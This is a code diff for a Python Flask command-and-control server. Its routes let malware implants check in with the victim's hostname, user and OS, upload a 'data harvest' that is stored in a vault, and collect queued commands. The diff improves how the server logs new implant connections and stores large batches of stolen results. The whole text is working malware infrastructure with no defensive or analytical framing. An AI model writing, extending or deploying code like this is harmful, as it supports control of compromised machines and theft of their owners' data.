@@ -222,7 +222,6 @@ def handle_c2_sanitize():
     else:
         return jsonify({"success": False, "error": "A database error occurred during sanitation."}), 500
 
-# --- THE BUG FIX IS HERE ---
 @app.route('/c2/get_all_vault_data', methods=['POST'])
 def handle_get_all_vault_data():
     username = request.json.get("username")
@@ -233,7 +232,6 @@ def handle_get_all_vault_data():
     logging.info(f"Fetched all vault data for user '{username}'. Found {len(all_data)} sessions.")
     
     return jsonify({"success": True, "data": all_data})
-# --- END OF BUG FIX ---
 
 @app.route('/implant/hello', methods=['POST'])
 def handle_implant_hello():
@@ -241,19 +239,31 @@ def handle_implant_hello():
     sid, c2_user = data.get("session_id"), data.get("c2_user")
     if not all([sid, c2_user]):
         return jsonify({"error": "session_id and c2_user are required"}), 400
+        
     metadata = {"hostname": data.get("hostname"), "user": data.get("user"), "os": data.get("os")}
+    
     with session_lock:
         is_new_or_reconnecting = sid not in active_sessions
         active_sessions[sid] = {"owner": c2_user, "last_seen": time.time()}
         db.create_or_update_session(sid, c2_user, metadata)
         if is_new_or_reconnecting:
+            logging.info(f"New implant connection from {metadata.get('user')}@{metadata.get('hostname')} (SID: {sid})")
             socketio.emit('new_session', {'session_id': sid, 'metadata': metadata, 'status': 'Online'}, room=c2_user)
+
+    # UPDATED: Handle large initial data harvest
     if "results" in data:
-        for result in data.get("results", []):
-            db.save_vault_data(sid, result.get("command"), result)
-        socketio.emit('batch_update', {'session_id': sid, 'results': data['results']}, room=c2_user)
+        results_list = data.get("results", [])
+        logging.info(f"Received {len(results_list)} result modules from SID {sid}.")
+        for result in results_list:
+            module_name = result.get("command")
+            if module_name:
+                db.save_vault_data(sid, module_name, result)
+        # Notify the client that new data has arrived
+        socketio.emit('batch_update', {'session_id': sid, 'results': results_list}, room=c2_user)
+        
     with cmd_lock:
         commands_to_send = command_queue.get(c2_user, {}).pop(sid, [])
+        
     return jsonify({"commands": commands_to_send})
 
 if __name__ == '__main__':
